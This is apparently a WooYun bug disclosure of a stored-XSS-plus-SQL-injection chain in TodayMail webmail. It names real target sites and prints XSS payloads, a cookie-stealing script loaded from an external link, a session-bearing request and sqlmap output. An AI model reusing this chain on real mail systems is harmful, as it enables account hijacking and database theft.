{"id": 65823, "wybug_id": "wooyun-2015-0125468", "wybug_title": "时代互联TodayMail系统xss盲打及sql注入（官方demo复现）", "wybug_corp": "广东时代互联科技有限公司", "wybug_author": "黑暗游侠", "wybug_date": "2015-07-09 10:05", "wybug_open_date": "2015-10-12 10:07", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向公众公开  简要描述： 时代互联TodayMail系统xss盲打及sql注入（官方demo复现）注入需要登陆 详细说明：  \t时代互联旗下的邮件系统存在通用注入， 时代互联官网：now.cn 涉及大量网站，包括政府站点，使用量绝对是海量级别的： \nhttp://mail.wfq.gov.cn/webmail/login.php?Cmd=login http://mail.totalfitness.com.cn/webmail/login.php?Cmd=login http://mail.qtc.org.cn/webmail/login.php?Cmd=login http://mail.yphb.com.cn/webmail/login.php?Cmd=loginhttp://mail.power-ring.cn/webmail/login.php?Cmd=login -----------\n这次发的是组合拳进行SQL注入经过反复测试，只有该唯一办法组合可以进行SQL注入注入产生在对query处的关键字查询过滤不严，但是该功能只对登陆后开放访问权限登陆验证phpsessid，无法伪造登陆用的邮箱和密码均为管理员自己设置的账号和密码而密码强度呢？是几乎不可能破解的我拿了的一个邮箱管理员的账号，可以来看一下设置：\n\n\n(密码为6个以上字符,只能由字母加数字,或者字母加 \"_\" , \"-\" , \".\",或者数字加\"_\" , \"-\" , \".\" 组成)\n密码强度很大，fuzzing是几乎很难做到的，虽然登陆验证码的设置不强再来看到另一处常规突破口，忘记密码\n\n如图，很遗憾，功能封锁。已经没有其他办法绕过登陆了，那么只剩下----------是的，没错 ：\nXss/Csrf\n拿到了用户的cookie，甚至只需要phpsessid即可，就可以登陆该邮箱，然后利用SQL缺陷进行注入攻击经过测试，该邮件系统标题和内容正文处均存在store xss漏洞测试用poc：\n<svg/onload=alert(1) /><fremeser onload=alert(1) />\n和标题一样，官方demo复现！==========================================================================\nmail.now.cn\n登陆处302到某台cdn\nhttp://cdn621.todayisp.net\n那就在这里做测试吧邮箱收集的过程就不再多说，官网、html标记都可以找到下面写一封邮件标题或正文插入：\n<script src=http://is.gd/FBslp6></script>\n没过多久就有了结果来看：\n\n成功获取到了cookie，也就拿到了phpsessid怎么用呢？#组合拳，SQL注入（注：登陆后多处未过滤存在注入）将盲打到的用户cookie放入以下data包中：\nGET /webmail/main/list_search.php?query=123*&=%E6%90%9C%E7%B4%A2%E9%82%AE%E4%BB%B6 HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://cdn621.todayisp.net/webmail/main/default.phpAccept-Language: en-USUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept-Encoding: gzip, deflateHost: cdn621.todayisp.netProxy-Connection: Keep-AliveCookie: CFG_LANGUAGE=gb; PHPSESSID=*********; LoginDomain=******; cookie_name=*********\n保存为1.txt (123*为未过滤注入处)接着使用sqlmap：\nsqlmap -r c:\\1.txt --dbs\n直接获得注入结果:\n\n\n\n全部数据库：\navailable databases [109]:[*] information_schema[*] MailFailRecord[*] MailTemp-1[*] MailTemp00[*] MailTemp01[*] MailTemp02[*] MailTemp03[*] MailTemp04[*] MailTemp05[*] MailTemp06[*] MailTemp07[*] MailTemp08[*] MailTemp09[*] MailTemp10[*] MailTemp11[*] MailTemp12[*] MailTemp13[*] MailTemp14[*] MailTemp15[*] MailTemp16[*] MailTemp17[*] MailTemp18[*] MailTemp19[*] MailTemp20[*] MailTemp21[*] MailTemp22[*] MailTemp23[*] MailTemp24[*] MailTemp25[*] MailTemp26[*] MailTemp27[*] MailTemp28[*] MailTemp29[*] MailTemp30[*] MailTemp31[*] MailTemp32[*] MailTemp33[*] MailTemp34[*] MailTemp35[*] MailTemp36[*] MailTemp37[*] MailTemp38[*] MailTemp39[*] MailTemp40[*] MailTemp41[*] MailTemp42[*] MailTemp43[*] MailTemp44[*] MailTemp45[*] MailTemp46[*] MailTemp47[*] MailTemp48[*] MailTemp49[*] MailTemp50[*] MailTemp51[*] MailTemp52[*] MailTemp53[*] MailTemp54[*] MailTemp55[*] MailTemp56[*] MailTemp57[*] MailTemp58[*] MailTemp59[*] MailTemp60[*] MailTemp61[*] MailTemp62[*] MailTemp63[*] MailTemp64[*] MailTemp65[*] MailTemp66[*] MailTemp67[*] MailTemp68[*] MailTemp69[*] MailTemp70[*] MailTemp71[*] MailTemp72[*] MailTemp73[*] MailTemp74[*] MailTemp75[*] MailTemp76[*] MailTemp77[*] MailTemp78[*] MailTemp79[*] MailTemp80[*] MailTemp81[*] MailTemp82[*] MailTemp83[*] MailTemp84[*] MailTemp85[*] MailTemp86[*] MailTemp87[*] MailTemp88[*] MailTemp89[*] MailTemp90[*] MailTemp91[*] MailTemp92[*] MailTemp93[*] MailTemp94[*] MailTemp95[*] MailTemp96[*] MailTemp97[*] MailTemp98[*] MailTemp99[*] mysql[*] NewTodaymail[*] proftpd[*] test[*] todaymail[*] todaymail20101208\n   漏洞证明：  \n\n\n\n   修复方案：  安全是一个整体   版权声明：转载请注明来源 黑暗游侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-12 10:07 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 10:16 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  俩个$是多少？？    \n     2015-07-09 10:17 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  那么给力马上就￥    \n     2015-07-09 10:21 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1427 漏洞数:426        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  这厂商是不是给乌云投资啦，发钱速度杠杠的    \n     2015-07-09 10:40 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  别说是domain那个参数，    \n     2015-07-09 10:59 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @wefgod 为什么我还没核心    \n     2015-07-09 10:59 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @紫霞仙子 咋可能    \n     2015-07-09 11:57 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @黑暗游侠 好像算平均rank的，我记得好像要高于5？还是6来着    \n     2015-07-09 12:59 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @wefgod 你看我上面几个，全都是核心，平均没我高    \n     2015-07-10 00:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @黑暗游侠 此时应该@疯狗 和@浩天  确实我看到有某人评价rank没有你高，可能是一段时间筛选一次    \n     2015-07-10 00:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @黑暗游侠 擦，这个漏洞是你路人甲的？    \n     2015-07-10 14:45 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @wefgod 额，没事，普通就普通吧没事    \n     2015-07-14 11:11 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  帅哥，你拿到shell了吧    \n     2015-07-14 12:18 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @xfkxfk 没有哈，可以拿shell，但是目录不解析没办法，突破不了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}